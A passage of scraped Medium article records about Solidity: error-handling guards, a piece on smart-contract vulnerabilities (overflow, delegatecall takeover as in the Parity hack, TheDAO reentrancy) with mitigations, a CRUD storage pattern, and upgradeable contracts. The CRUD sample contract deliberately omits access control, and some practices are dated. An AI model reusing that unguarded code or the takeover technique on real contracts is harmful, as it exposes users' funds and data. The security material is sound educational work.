EVM", "post_link": "https://medium.com/blockchannel/the-use-of-revert-assert-and-require-in-solidity-and-the-new-revert-opcode-in-the-evm-1a3a7990e06e?source=search_post---------2", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2017-09-27", "last_modified_date": "2018-06-19", "readtime": "5.23", "claps": 2569, "voters": 324, "content": "Solidity Learning: Revert(), Assert(), and Require() in Solidity, and the New REVERT Opcode in the EVMUpcoming Changes to Solidity and How They FunctionSteven McKieFollowSep 27, 2017 \u00b7 6 min readPhoto by Osman RanaCrosspost: This post was originally written by \u201cMaurelian\u201d of ConsenSys and can be found here. This was posted with his permission, enjoy!The release of Solidity version 0.4.10 introduced the assert(), require()and revert() functions, and confusion has reigned ever since.In particular, the assert() and require() \u201cguard\u201d functions improve the readability of contract code, but differentiating between them can be quite confounding.In this article, I\u2019ll:explain the problem these functions solve.discuss how the Solidity compiler handles the new assert(), require()and revert().Give some rules of thumb for deciding how and when to use each one.For convenience, I\u2019ve created a simple contract using each of these features which you can test out in remix.If you really just want a TLDR, this answer on the ethereum stackexchangeshould do it.Patterns for error handling in SolidityThe old way: throw and the if \u2026 throw patternSay your contract has a few special functions, that should only be callable by a particular address which is designated as the owner.Prior to Solidity 0.4.10 (and for a while afterwards), this was a common pattern for enforcing permissions:contract HasAnOwner {    address owner;        function useSuperPowers(){         if (msg.sender != owner) { throw; }        // do something only the owner should be allowed to do    }}If the useSuperPowers() function is called by anyone other than owner, the function will throw returning an invalid opcode error, undoing all state changes, and using up all remaining gas (see this article for more on gas and fees in ethereum).The throw keyword is now being deprecated, and eventually will be removed altogether. Fortunately, the new functions assert(), require(), and revert() provide the same functionality, with a much cleaner syntax.Life after throwLet\u2019s look at how to update that if .. throw pattern with our new guard functions.This line:if(msg.sender != owner) { throw; }currently behaves exactly the same as all of the following:if(msg.sender != owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner);Note that in the assert() and require() examples, the conditional statement is an inversion of the if block\u2019s condition, switching the comparison operator !=to ==.Differentiating between assert() and require()First, to help separate these \u2018guard\u2019 functions in your mind, imagine assert()as an overly assertive bully, who steals all your gas. Then imagine require()as a polite managerial type, who calls out your errors, but is more forgiving.With that mnemonic handy, what\u2019s the real difference between these two functions?Prior to the Byzantium network upgrade, require() and assert() actually behave identically, but their bytecode output is slightly different.assert() uses the 0xfe opcode to cause an error conditionrequire() uses the 0xfd opcode to cause an error conditionIf you look up either of those opcodes in the yellow paper, you won\u2019t find them. This is why you see the invalid opcode error, because there\u2019s no specification for how a client should handle them.That will change however after Byzantium, and the implemention of EIP-140: REVERT instruction in the Ethereum Virtual Machine . Then the0xfd opcode will be mapped to theREVERT instruction.This is what I find really fascinating:Many contracts have been deployed since version 0.4.10, which include a new opcode lying dormant, until it\u2019s no longer invalid. At the appointed time, it will wake up, and become REVERT!Note: throw andrevert() also use 0xfd. Prior to 0.4.10. throw used 0xfe.What the REVERT opcode will doREVERT will still undo all state changes, but it will be handled differently than an \u201cinvalid opcode\u201d in two ways:It will allow you to return a value.It will refund any remaining gas to the caller.1. It will allow you to return a valueMost smart contract developers are quite familiar with the notoriously unhelpful invalid opcode error. Fortunately, we\u2019ll soon be able to return an error message, or a number corresponding to an error type.That will look something like this:revert(\u2018Something bad happened\u2019);orrequire(condition, \u2018Something bad happened\u2019);Note: solidity doesn\u2019t support this return value argument yet, but you can watch this issue for that update.2. Refund the remaining gas to the callerCurrently, when your contract throws it uses up any remaining gas. This can result in a very generous donation to miners, and often ends up costing users a lot of money.Once REVERT is implemented in the EVM, it will be plain old bad manners not to use it to refund the excess gas.Choosing between revert(), assert() and require()So, ifrevert() and require() both refund any left over gas, AND allow you to return a value, why would want to burn up gas using assert()?The difference lies in the bytecode output, and for this I\u2019ll quote from the docs(emphasis mine):The require function should be used to ensure valid conditions, such as inputs, or contract state variables are met, or to validate return values from calls to external contracts. If used properly, analysis tools can evaluate your contract to identify the conditions and function calls which will reach a failing assert. Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix.To clarify that somewhat: it should be considered a normal and healthy occurrence for a require() statement to fail (same with revert()). When an assert() statement fails, something very wrong and unexpected has happened, and you need to fix your code.By following this guidance, static analysis and formal verification tools will be able to examine your contracts to find and prove the conditions which could break your contract, or to prove that your contract operates as designed without flaws.In practice, I use a few heuristics to help me decide which is appropriate.Use require()to:Validate user inputs ie. require(input<20);Validate the response from an external contract ie. require(external.send(amount));Validate state conditions prior to execution, ie. require(block.number > SOME_BLOCK_NUMBER) or require(balance[msg.sender]>=amount)Generally, you should use require most oftenGenerally, it will be used towards the beginning of a functionThere are many examples of require() in use for such things in our Smart Contract Best Practices.Use revert()to:Handle the same type of situations as require(), but with more complex logic.If you have some complex nested if/else logic flow, you may find that it makes sense to use revert() instead of require(). Keep in mind though, complex logic is a code smell.Use assert() to:Check for overflow/underflow, ie. c = a+b; assert(c > b)Check invariants, ie. assert(this.balance >= totalSupply);Validate state after making changesPrevent conditions which should never, ever be possibleGenerally, you will probably use assert less oftenGenerally, it will be used towards the end of a function.Basically, require() should be your go to function for checking conditions, assert() is just there to prevent anything really bad from happening, but it shouldn\u2019t be possible for the condition to evaluate to false.Also: \u201cyou should not use assert blindly for overflow checking but only if you think that previous checks (either using ifor require) would make an overflow impossible\u201d. \u2014 comment from @chrisethConclusionThese functions are very powerful tools for your security toolbox. Knowing how and when to use them will not only help prevent vulnerabilities, but also make your code more user friendly, and future proof against upcoming changes.Do you love this stuff?I\u2019m part of the team at ConsenSys Diligence. If you have a knack for diving deeply into Solidity and the EVM, and an interest in smart contract security, we\u2019re looking for people to join our smart contract audit practice (apply here).If you made it this far in the post, but don\u2019t meet the exact criteria in the job description, that\u2019s OK. Just include a message mentioning this post, and calling out your experience with, and interest in Ethereum.", "responses": 17, "tags": ["Ethereum", "Blockchain", "Solidity"]}, {"title": "How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part 1)", "post_link": "https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d?source=search_post---------3", "author_name": "Georgios Konstantopoulos", "author_link": "https://medium.com/@gakonst", "publish_date": "2018-01-08", "last_modified_date": "2019-08-19", "readtime": "4.33", "claps": 1962, "voters": 284, "content": "How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part 1)Georgios KonstantopoulosFollowJan 8, 2018 \u00b7 5 min readIn a previous post we discussed the future of Ethereum\u2019s scalability by analyzing the concepts presented at Devcon3. Let\u2019s take a moment and imagine that all these scalability issues are now solved, and Ethereum\u2019s Smart Contracts are working without issues.Are those users going to be good willed or are they possible adversaries who interfere with the smooth functionality of the contracts?Smart contracts are \u201cimmutable\u201d. Once they are deployed, their code is impossible to change, making it impossible to fix any discovered bugs.In a potential future where whole organizations are governed by smart contract code, there is an immense need for proper security. Past hacks such as TheDAO or this year\u2019s Parity hacks (July, November) have raised developers\u2019 awareness, but we still have a long way to go.\u201cThis is Disneyland for hackers\u201dIn this article we will go through some of the famous security pitfalls and their mitigations.1. Overflows & UnderflowsAn overflow is when a number gets incremented above its maximum value. Solidity can handle up to 256 bit numbers (up to 2\u00b2\u2075\u2076-1), so incrementing by 1 would result into 0.  0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF+ 0x000000000000000000000000000000000001----------------------------------------= 0x000000000000000000000000000000000000After reaching the maximum reading, an odometer or trip meter restarts from zero, called odometer rollover.[source]Likewise, in the inverse case, when the number is unsigned, decrementing will underflow the number, resulting in the maximum possible value.  0x000000000000000000000000000000000000- 0x000000000000000000000000000000000001----------------------------------------= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFYou can test the bug here:As dangerous as both cases are, the underflow case is the more likely to happen, for example in the case where a token holder has X tokens but attempts to spend X+1. If the code does not check for it, the attacker might end up being allowed to spend more tokens than he had and have a maxed out balance.Mitigation: It has been a standard for a while now to use OpenZeppelin\u2019s SafeMath library.You can test the fixed bug here:2. Visibility & delegatecallFor the people who were around in July, this bug will be familiar, after all it was the Parity wallet hack which cost users about 30 million dollars.Solidity visibility modifiers and their differences.Public functions can be called by anyone (by functions from inside the contract, by functions from inherited contracts or by outside users)External functions can only be accessed externally, which means they cannot be called by other functions of the contract. The gist below does not compile, the external visibility of cannotBeCalled does not allow it to be called by the contract\u2019s functions (however it can be called by another contract)External is cheaper to use because it uses the calldata opcode while public needs to copy all the arguments to memory, as described here.Private and internal are simpler: private means that the function can only be called from inside the contract, while internal proves a more relaxed restriction allowing contracts that inherit from the parent contract to use that function.That said, keep your functions private or internal unless there is a need for outside interaction.DelegatecallParaphrased from the solidity docs:\u201cDelegatecall is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.\u201dThis low-level function has been very useful as it\u2019s the backbone for implementing Libraries and modularizing code. However it opens up the doors to vulnerabilities as essentially your contract is allowing anyone to do whatever they want with their state.In the example below, an attacker can call contract Delegate\u2019s public function pwn and since the call is in the context of Delegation, they can claim ownership of the contract.The Parity hack involved a combination of both insecure visibility modifiers and misuse of delegate call with abritrary data. The vulnerable contract\u2019s function implemented delegatecall and a function from another contract that could modify ownership was left public. That allowed an attacker to craft the msg.data field to call the vulnerable function.As for what would be included in the msg.data field, that is the signature of the function that you want to call. Signature here means the first 8 bytes of the sha3 (alias for keccak256)hash of the function prototype.In this case:web3.sha3(\"pwn()\").slice(0, 10) --> 0xdd365b8bIf the function takes an argument, pwn(uint256 x):web3.sha3(\"pwn(uint256)\").slice(0,10) --> 0x35f4581b3. Reentrancy (TheDAO hack)Solidity\u2019s call function when called with value forwards all the gas it received. In the snippet below, the call is made before actually reducing the sender\u2019s balance. This opened up a vulnerability which is described very well in reddit comment when TheDAO hack happened:\u201cIn simple words, it\u2019s like the bank teller doesn\u2019t change your balance until she has given you all the money you requested. \u201cCan I withdraw $500? Wait, before that, can I withdraw $500?\u201dAnd so on. The smart contracts as designed only check you have $500 at the beinning, once, and allow themselves to be interrupted.\u201dAs described in detail here, the fix is to reduce the sender\u2019s balance before making the transfer of value. For people who have worked with parallel programming, another solution is using mutexes, mitigating all kinds of race conditions altogether.Currently, using msg.sender.transfer(_value) is the best practice. If you really need to use send userequire(msg.sender.send(_value));(Thank you Hayden Adams and Paulius for the fix on the above statement!)This concludes Part 1. In the next article, we will discuss some lesser known exploits, the tools you should add to your workflow and the future of smart contract security.Sign up below to get alerted when it goes live.Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 7, "tags": ["Blockchain", "Ethereum", "Smart Contracts", "Security", "Hacking"]}, {"title": "Solidity CRUD- Part 1", "post_link": "https://medium.com/robhitchens/solidity-crud-part-1-824ffa69509a?source=search_post---------4", "author_name": "Rob Hitchens", "author_link": "https://medium.com/@robhitchens", "publish_date": "2017-02-20", "last_modified_date": "2019-07-21", "readtime": "12.6", "claps": 2524, "voters": 286, "content": "Solidity CRUD- Part 1Rob HitchensFollowFeb 20, 2017 \u00b7 13 min readData Storage With Sequential Access, Random Access and DeleteUpdate 2019: The pattern described here is available as a Library now: https://medium.com/@robhitchens/solidity-crud-epilogue-e563e794fdeCode and PDF docs available at https://bitbucket.org/rhitchens2/soliditycrudIt seems to be a rite-of-passage to study Solidity and then branch out in search of the database stuff; the hidden assumption being that a modern language must have a generalized storage system that maps more or less to the way we think about tables, collections, indexes and queries.There\u2019s no database. We are responsible for the internal organization of data at a deep level. This implies that we\u2019ll need to address details we may not be accustomed to dealing with.Let\u2019s proceed on the assumption that we will frequently need a well-solved general-purpose pattern for handling on-chain table-like storage.C.R.U.D. \u2014 Create, Retrieve, Update, DeleteIn this two-part series, we\u2019re going to explore a pattern that will help us:1) organize a single entity (\u201ctable\u201d or \u201ccollection\u201d if you prefer) with a defined set of fields (\u201ccolumns\u201d, \u201cattributes\u201d, or \u201cproperties\u201d),2) insert new records (or \u201cdocuments\u201d) known by a Key (\u201cprimary key\u201d, \u201cdocument id\u201d),3) randomly retrieve records by their keys,4) retrieve a record count,5) access a list of all the records that exist,6) update field(s) in any given record,7) validate that keys exist, or do not exist, and8) delete a record while maintaining the internal structure.And, we want it keep it simple:1) a simple mental model we won\u2019t get lost in,2) as few lines of code as possible, so we don\u2019t get lost in that, and3) efficient gas consumption, so we aren\u2019t discouraged from using it.Importantly:1) It should scale.For many use-cases, simply creating, retrieving and updating is sufficient. In part 1, we\u2019ll explore a rugged, flexible and minimalist pattern for these three operations. In part 2, we\u2019ll extend the pattern with a Delete function.The User ExampleWe\u2019ll apply the pattern to an imagined collection of users we want to store. The records have:1) Wallet addresses we will use as Keys,2) Email addresses, and3) AgeThe pattern can be adapted to any data structure where the fields are known in advance.The Basic Tools \u2014 MappingsMappings are, generally-speaking, distributed hash tables that provide one-move lookups and writes to a massive address space. The address space is exclusive to our contract. Here\u2019s a simple example:mapping (address => uint) userBalances;What it says:1) This will be an address space.2) The keys will be type address, such as msg.sender.3) We\u2019re going to store a uint (unsigned integer) in each mapped location.4) We\u2019ll call those values userBalances.It\u2019s important to know that even though we haven\u2019t actually written anything to this address space yet, all possible locations are zeroed out.You can think of the example mapping as a huge table with a primary key of type address in which all possible addresses now exist. A second column contains an unsigned integer called userBalances, all of which have been initialized to zero[i].We can set and get values like this:address key = msg.sender; // the key is an addressuserBalances[key] = 100; // set valueuint retrievedBalance = userBalances[key]; // get valueThere\u2019s a vexing limitation here. There is no obvious way to know the keys that have been written to. There is no way to know how many keys exist (because they all exist). There is no way to iterate over the keys. Awkward.The Basic Tools \u2014 ArraysWe can have arrays of defined types and those arrays can be fixed length or dynamic. We\u2019ll use a dynamic array to maintain an unordered list of keys so we can know how many records exist and what their keys are.We define a dynamic array of addresses that we\u2019ll call userIndex. We\u2019re going track the keys we insert.address[] userIndex;We can append a new key to the index with ease:userIndex.push(anAddress);We can get the record count with ease:uint count = userIndex.length;We can retrieve keys from the list by their row numbers:address firstUserAddress = userIndex[0];address secondUserAddress = userIndex[1];The Basic Tools \u2014 StructsA struct is a way to create our own variable types. They use named keys that map to other already existing types. For example:struct UserStruct { bytes32 userEmail; uint userAge;}Now we have a type called UserStruct. We can use it to define a new variable:UserStruct aUser;We can start treating aUser as something that maps reasonably well to our idea of a record:aUser.userEmail = emailInHex;aUser.userAge = ageAsUnsignedInteger;We can store such structs in a mapping:mapping(address => UserStruct) userStructs;Solidity Mapping to StructsOrganized this way, we can randomly access a complete user record and its fields using the key:bytes32 hisEmail = userStructs[hisAddress].email; // getuserStructs[hisAddress].email = newEmailInHex; // setPutting This Together: Summary of Data OrganizationWe\u2019re going to combine these tools for the desired effect. We\u2019ll use:1) A struct, for record details. It will contain all the fields except the key.2) A mapping of keys to struct instances.3) An array that will be an unordered index of keys. In the example, these are user addresses.Create / Insert:1) Store the values in the struct.2) Store the structure in the mapping.3) Append the primary key to the index array. This forms an unordered list of the keys in the system.Our interface will look like this:function insertUser(  address userAddress,   bytes32 userEmail,   uint userAge)   public   returns(bool success) {}We can imagine a very simple process that addresses steps 1 & 2:function insertUser( address userAddress, bytes32 userEmail, uint userAge) public returns(bool success){ userStructs[userAddress].userEmail = userEmail; userStructs[userAddress].userAge = userAge; return true;}We can address step 3 by adding the new key to the unordered key list:userIndex.push(userAddress);This will get us most of the way there, but keep reading. We will elaborate on this slightly later in the paper.Retrieve1) Look up the structure in the map using the primary key.Our interface will look like this:function getUser(address userAddress)   public   constant   returns(bytes32 userEmail, uint userAge) {}For clarity, this function doesn\u2019t return the key (userAddress) because we obviously already know its value. This is also why we don\u2019t store keys in the UserStructs. Doing so would be redundant.Similarly, we can imagine the first formative conception of the function that we will elaborate on shortly:function getUser(address userAddress) constant returns(bytes32 userEmail, uint userAge){ return(  userStructs[userAddress].userEmail,  userStructs[userAddress].userAge);}Update1) Set a value in a struct stored in the map located by the primary key.Our interface can be for a single field (as in the Sample Implementation):function updateUserEmail(address userAddress, bytes33 userEmail)  public   returns(bool success) {}Or, we can opt for a whole record or any useful combination of fields:function updateUser(  address userAddress,   bytes32 userEmail,   uint userAge)   public   returns(bool success) {}In this system, any formation of fields can be attached to a key. No changes to keys are allowed. It\u2019s not unthinkable to extend the pattern to support that but it implies an unwanted increase in complexity.Does this key exist?When we organize data using unique identifiers, the identifiers need to be unique, by definition. We will find it desirable to check for the existence of a key.A mapping initializes struct members to 0, but 0 may have meaning in our application. In other words, if(value==0) won\u2019t indicate that no data exists in all cases. Perhaps it is valid data and the answer is 0. We want a widely applicable pattern.One solution to this problem is to set a Boolean flag to indicate that there is indeed data stored in the mapping at a given location. Using this approach, we would add a member to the struct:struct UserStruct {  bytes32 userEmail;  uint userAge;  bool isUser;}We would set this flag to true as we add users. We could easily imagine a simple function to check if stored structs contain explicitly set information and not merely defaults:Function isUser(address userAddress)   public   constant   returns(bool isIndeed) {  return userStructs[userAddress].isUser;}This is a valid approach. With this structure in place, we can then embellish the insert, retrieve and update functions with some logical constraints:\u00b7 Cannot insert a key that already exists.\u00b7 Cannot update a key that doesn\u2019t exist.\u00b7 Cannot retrieve a key that doesn\u2019t exist.We\u2019ll find it advantageous that these functions differentiate between logical and illogical requests. For example, the retrieve function differentiates between an all zero response to a zeroish record that does exist, and a throw response to a record that simply does not exist.This system will work in the case that:\u00b7 A delete function is not required\u00b7 A delete function will never be required, even in the case of upgraded logic.We can overcome this limitation using a slightly different strategy for determining the existence/non-existence of a key. The following data structure will support a delete operation if we ever need to add one. The delete procedure will be explained in Part 2 of this series.Instead of adding a Boolean, flag to the struct, we\u2019ll add a pointer. This pointer will indicate the key\u2019s position in the unordered list of keys, called userIndex.struct UserStruct { bytes32 userEmail; uint userAge; uint index; // <= this}Pointer Logic in InsertsWe need an additional step in the insert process:1. Set the index pointer in the stored struct. It always equals the index.length because we\u2019re always adding to the end of the index. For example:userStruct[newKey].index = userIndex.length;In case this isn\u2019t clear, the index starts at 0. Suppose we have 939 records in rows 0\u2013938. index.length will be 939. We\u2019ll record 939 in the pointer, because when we push() the new key into the index in the next step, it will certainly land in row 939.Even better, since .push() returns the new array length, we can use it in concert with this step and reduce our gas cost a little:userStructs[newKey].index = userIndex.push(userAddress)-1;Referential IntegrityAn astute reader pointed out that if the index ever gets out of sync with the stored records, we will have a serious problem. Smart Contracts are especially good at ensuring such a situation never unfolds if we code them correctly, so we focus on prevention. No provision is made for messy exceptions.Internal referential integrity is maintained at all times. Inserts and deletes either complete entirely or not at all. The rules are fairly simple. Be careful to strictly enforce these rules and test, test, test your implementation of this pattern to be sure you captured all the steps.1. There is a two-way binding between the mapped structs and the index.2. Don\u2019t allow any operation to break Rule #1. Our operations are atomic. They execute in an \u201call or nothing\u201d fashion. Operations that don\u2019t succeed completely are reverted completely so no incomplete reorganization is ever permitted. Ensure your implementation adheres to this principle.It\u2019s advisable to set the index and mapping to private to ensure no accidental overwrites from child contracts.mapping (address => UserStruct) private userStructs;address[] private userIndex;Invalid Requests Fail Early and Fail HardWe throw on invalid operations to ensure referential integrity is never broken:1) update a field in a non-existent record (missing key),2) insert a duplicate key.There\u2019s no good reason to do those things.We also throw if one tries to retrieve details about a key that doesn\u2019t exist. That means a deleted record is gone unless additional logic is added to defeat the design. It also means an all zero response to an existing key is clearly differentiated from an abortive response to a non-existent key.Check If Key ExistsWe can validate the existence (or non-existence) of a record given a primary key to test:1) Get the index pointer from the structure stored in the map at the primary key location.2) Compare the index at the pointed-to row number with the key we are testing. In practice, we can\u2019t access non-existent rows in the index. In the case that the index is empty, we will know there is no possibility of a match.3) In the case that there is at least one other Key in the list and the retrieved mapped value refers to it, we compare. Do they match?If it\u2019s a key that exists, say \u2026 \u201cG\u201d, we would:1) Notice the unordered list isn\u2019t empty.2) Look up the struct stored in the mapping at \u201cG\u201d and note that it says index row \u201c3\u201d.3) Look up the address stored in index row \u201c3\u201d and note that it says \u201cG\u201d.4) Find that \u201cG\u201d == \u201cG\u201d, and conclude that \u201cG\u201d exists.If the key doesn\u2019t exist, say \u2026 \u201cZ\u201d, we would follow the same process, but it wouldn\u2019t pass:1) If the list is empty, the Key doesn\u2019t exist.2) Look up the structure stored at \u201cZ\u201d and note that it says index row \u201c0\u201d (because of defaults).3) Look up the address stored in index row \u201c0\u201d and note that it says \u201cA\u201d.4) Find that \u201cA\u201d != \u201cZ\u201d, and conclude that \u201cZ\u201d does not exist.The example code is using userAddress for primary keys. It checks if keys do or don\u2019t exist in one step, like this:If(userIndex.length == 0) return false; // the list is empty, so \u201cthe\u201d key to test isn\u2019t presentreturn(userIndex[userStructs[userAddress].index] == userAddress); // true = existsThe return is nesting a few arguments to complete the 3-step logic in one statement. If the list is empty, or the round-trip consistency isn\u2019t there, the tested key definitely doesn\u2019t exist. If the round-trip consistency is there, then the key definitely does exist.We add a function to check this, and expose the function publicly so clients can use it:function isUser(address userAddress) public constant returns(bool isIndeed){ if(userIndex.length == 0) return false; return (userIndex[userStructs[userAddress].index] == userAddress);}We use this function to check the existence of keys before we permit any changes, and before we return an instance/record. Any illogical request fails hard with throw.if(!isUser(userAddress) throw; // missing keyThe Example Implementation stores two simple non-key fields; userEmail and userAge. The actual mapped structs you store this way can contain any Solidity data type including arrays and structs. Be aware of storage costs and stack depth, and remember that not everything belongs in on-chain storage.We can round out the basic functionality of this pattern with some useful functions that are very simple to deploy.Iterable InterfaceWe expose the record count \u2026function getUserCount() public constant returns(uint count) { return userIndex.length;}And a function to support iteration over the list:function getUserAtIndex(uint index)   public   constant   returns(address userAddress) {  return userIndex[index];}A web3 client can:1) Get the size of the index: UserCrud.getUserCount.call()*for(row=0; row < count; row++) {2) Retrieve the keys one by one:UserCrud.getUserAtIndex.call(row)3) Retrieve the details key by key:UserCrud.getUser.call(theAddressFromStep2)}*Truffle styleWe\u2019ll add event emitters so a web3 client can also monitor events that chronicle every state change that has ever taken place and arrive in a timely fashion suitable for live updates.Event EmittersIt\u2019s a best practice to emit events for state changes within a contract. Clients can use these to maintain their own synchronized copies of the stored data. That means clients have two avenues to interact with this on-chain storage:1) Getter functions that retrieve the current state, and2) Event emitters that report all state changesevent LogNewUser (  address indexed userAddress,  uint index,   bytes32 userEmail,   uint userAge);event LogUpdateUser(  address indexed userAddress,   uint index,   bytes32 userEmail,   uint userAge);We index the userAddresses so clients can quickly filter, sort and find relevant information in the event logs. We emit the index rows because they are part of the state. We further refine the return value in our create function, substituting uint index for bool success. Don\u2019t worry about returning 0. Row 0 is valid. An invalid operation will throw an error and no event will be emitted.Gas Consumption and PerformanceWhile not formally tested, gas consumption is expected to remain approximately consistent at any scale because each write operation proceeds in a step-by-step fashion with no branching or loops.Representative write costs (Sample implementation):\u00b7 insertUser(): 89K\u00b7 updateUserEmail(): 8K\u00b7 updateUserAge(): 8KThe \u201cconstant\u201d functions we use for read-only access are free, but gas is a useful proxy for the workload involved:\u00b7 getUserAtIndex(): 700 gas\u00b7 getUser(): 1,400 gas\u00b7 getUserCount(): 400 gasThese figures are rounded up from observed results January, 2017, solc 0.4.9.DeleteIn part 2, we\u2019ll expand on this example, to add a deleteUser() function. We\u2019ll show a simple process for reorganizing the internal data structure efficiently, with a consistent gas cost at any scale.AcknowledgementI\u2019d like to thank Xavier Lepretre, senior consultant at B9Lab, for his indispensable input and support.A Note About SecurityIn most cases you will want to restrict access to the insert/update and possibly get functions. You may wish to add an \u201conlyOwner\u201d modifier to the public functions or change them to internal so only child contracts can use them.There is considerable latitude in the implementation of this pattern. Suffice it to say that you shouldn\u2019t overlook the critically important detail of restricting function access to entities that should have it.Sample ImplementationFor clarity, security is intentionally omitted.pragma solidity ^0.4.6;contract UserCrud {  struct UserStruct {    bytes32 userEmail;    uint userAge;    uint index;  }    mapping(address => UserStruct) private userStructs;  address[] private userIndex;  event LogNewUser   (address indexed userAddress, uint index, bytes32 userEmail, uint userAge);  event LogUpdateUser(address indexed userAddress, uint index, bytes32 userEmail, uint userAge);    function isUser(address userAddress)    public     constant    returns(bool isIndeed)   {    if(userIndex.length == 0) return false;    return (userIndex[userStructs[userAddress].index] == userAddress);  }  function insertUser(    address userAddress,     bytes32 userEmail,     uint    userAge)     public    returns(uint index)  {    if(isUser(userAddress)) throw;     userStructs[userAddress].userEmail = userEmail;    userStructs[userAddress].userAge   = userAge;    userStructs[userAddress].index     = userIndex.push(userAddress)-1;    LogNewUser(        userAddress,         userStructs[userAddress].index,         userEmail,         userAge);    return userIndex.length-1;  }    function getUser(address userAddress)    public     constant    returns(bytes32 userEmail, uint userAge, uint index)  {    if(!isUser(userAddress)) throw;     return(      userStructs[userAddress].userEmail,       userStructs[userAddress].userAge,       userStructs[userAddress].index);  }     function updateUserEmail(address userAddress, bytes32 userEmail)     public    returns(bool success)   {    if(!isUser(userAddress)) throw;     userStructs[userAddress].userEmail = userEmail;    LogUpdateUser(      userAddress,       userStructs[userAddress].index,      userEmail,       userStructs[userAddress].userAge);    return true;  }    function updateUserAge(address userAddress, uint userAge)     public    returns(bool success)   {    if(!isUser(userAddress)) throw;     userStructs[userAddress].userAge = userAge;    LogUpdateUser(      userAddress,       userStructs[userAddress].index,      userStructs[userAddress].userEmail,       userAge);    return true;  }  function getUserCount()     public    constant    returns(uint count)  {    return userIndex.length;  }  function getUserAtIndex(uint index)    public    constant    returns(address userAddress)  {    return userIndex[index];  }}Code and PDF docs available at https://bitbucket.org/rhitchens2/soliditycrudEnd Notes[i] Mappings are initialized to zero for each key hash in a contract\u2019s mapping. In the unlikely event that two keys with identical hashes can be found, called a hash collision, values at the mapped location will not necessarily be initialized to zero. A mapping location may indeed be occupied by unexpected data. Such a collision is statistically improbable. At the time of writing, no hash collision has been discovered using the Keccak-256 cryptographic hash function employed by Ethereum\u2019s mappings.Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": 21, "tags": ["Ethereum", "Blockchain", "Solidity", "Database", "Storage"]}, {"title": "Writing upgradable contracts in Solidity", "post_link": "https://medium.com/colony/writing-upgradeable-contracts-in-solidity-6743f0eecc88?source=search_post---------5", "author_name": "Elena Dimitrova", "author_link": "https://medium.com/@elena_di", "publish_date": "2016-06-08", "last_modified_date": "2018-06-21", "readtime": "3.09", "claps": 1888, "voters": 286, "content": "Writing upgradable contracts in SolidityElena DimitrovaFollowJun 8, 2016 \u00b7 4 min readEthereum contracts are immutable \u2014 once deployed to the blockchain they cannot be updated, yet the need to change their logic with time is ultimately necessary. This article presents one way to implement upgradeable Ethereum contracts.During a contract upgrade the following factors need to be considered:Block gas limit (4712388 for Homestead)Upgrade transactions tend to be large due to the amount of processing they have to complete e.g. deploy a contract, move data, move references.Inter-contract dependencies \u2014 when a contract is compiled, all of its imports are compiled into the contract thus leading to a ripple effect when you want to swap out a contract which is being referenced by other contracts.These two are related, as having more dependencies affects the size of your deployed contracts and the overall transaction size of the upgrade. The implementation patterns below work to minimise the upgrade gas costs as well as loosening the coupling of contracts without breaking Solidity type safety.Note that for the sake of simplifying the examples, we have omitted the implementation of security and permissions.Avoid large data copy operationsStoring data is expensive (SSTORE operation costs 5000 or 20000 gas, http://gavwood.com/Paper.pdf) and upgrading contracts containing large storage variables runs the chance of hitting the transaction gas limit during the copying of its data. You may therefore want to isolate your datastore from the rest of your code, and make it as flexible as possible, so that it is unlikely to need to be upgraded.Depending on your circumstances, how large of a datastore you need and whether you expect its structure to change often, you may choose a strict definition or a loosely typed flat store. Below is an example of the latter which implements support for storing a sha3 key and value pairs. It is the more flexible and extensible option. This ensures data schema changes can be implemented without requiring upgrades to the storage contract.For upgrades you can then just switch the upgraded contract to point to the new EternalStorage contract instance without having to copy any of its data.Use libraries to encapsulate logicLibraries are a special form of contracts that are singletons and not allowed any storage variables. http://solidity.readthedocs.io/en/latest/contracts.html#librariesThe advantage of libraries in the context of upgrades is that they allow encapsulation of business logic or data management logic (which more frequently change) into singleton instances that cost only upgrading one and not many contracts.Example below shows a library used for adding a Proposal to storage.Sample library used for adding Proposals to storrageUnder the cover, library functions are called using delegatecall from the calling contract which has the advantage of passing the msg.sender and msg.value seamlessly. You can therefore write your library code as if it were just part of your contract, without having to worry about the sender or value changing.The example below shows a sample Organisation contract using ProposalsLibrary to interact with data storage.Sample Organisation contract calling library functionsWith libraries, there is a slight gas overhead on each call. However, it makes deploying a new contract much cheaper. In the case of Organisation, deployment cost has dropped by 10% :                            (before / after) library implementationcreating an Organisation :  1179032 / 1048206creating a Proposal      :    71964 /   72599Use \u2018interfaces\u2019 to decouple inter-contract communicationAbstract contract implementation behind an interface that only defines its function signatures.This is a well known pattern in object oriented programming so if you\u2019ve done any .NET or Java you\u2019ll be at home with this concept of abstraction. This is best shown by an example, consider the following use of :Organisation contract working with a TokenLedger interfaceHere instead of importing the entire TokenLedger.sol contract, we use an interface containing just the function signatures. This eases any possible upgrades to TokenLedger which don\u2019t affect its interface, too, which with this model can be implemented without redeploying the Organisation (calling) contract.SummaryThe guiding principle in this refactoring was the Ethereum white paper \u2018DAO\u2019 section https://github.com/ethereum/wiki/wiki/White-Paper#decentralized-autonomous-organizations, which writesAlthough code is theoretically immutable, one can easily get around this and have de-facto mutability by having chunks of the code in separate contracts, and having the address of which contracts to call stored in the modifiable storage.Implementing permanent storage, encapsulating logic in library functions and abstracting via an interface are all in line with this principle where we use address pointers in the calling Organisation contract for interacting with storage and business logic. 